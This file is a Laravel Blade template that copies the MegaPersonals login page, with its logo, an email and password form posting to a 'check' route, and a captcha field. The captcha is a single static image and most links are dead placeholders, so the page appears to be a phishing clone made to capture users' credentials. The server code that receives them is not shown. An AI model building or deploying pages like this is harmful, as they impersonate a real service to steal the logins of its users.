@include ('layout.header')
<style>
       @media (max-width: 576px) {
            .container {
                padding: 20px;
            }
        }
    </style>
<body class="d-flex justify-content-center align-items-center vh-100">

    <div class="container">
        <!-- Logo Section -->
        <div class="brand-logo">
            <img src="{{asset('img\megapersonals.png')}}" alt="MegaPersonals">
        </div>

        <p class="text-center mb-3">Is this your first time posting?</p>
        <button class="btn btn-primary mb-4">Start Here</button>

        <!-- Login Form -->
        <p class="text-center mb-3">Already have a login?</p>
        <form action="{{ route('check') }}" method="POST">
            @csrf
            <div class="mb-3">
                <label for="email" class="form-label">Email</label>
                <input type="email" id="email" name="email" class="form-control" required>
            </div>
            <div class="mb-3">
                <label for="password" class="form-label">Password</label>
                <input type="password" id="password" name="password" class="form-control" required>
            </div>
            <div class="captcha-container">
                <img src="{{ asset('img/captures.jpg') }}" alt="Captcha">
                <input type="text" name="captcha" class="form-control" placeholder="Enter code from the picture" required>
            </div>
            <button type="submit" class="btn btn-primary">Submit</button>
        </form>

        <!-- Forgot Password Section -->
        <div class="text-center mt-3">
            <p><a href="#">FORGOT PASSWORD?</a></p>
        </div>

        <!-- Footer Links -->
        <div class="footer-links text-center mt-4">
            <a href="#">Home</a>
            <a href="#">Manage Posts</a>
            <a href="#">Contact Us</a>
            <a href="#">Policies & Terms</a>
        </div>

        <!-- Copyright Section -->
        <div class="text-center mt-4">
            <p>Copyright &copy; 2021 <span>MegaPersonals.eu</span></p>
        </div>

    </div>

    @include ('layout.footer')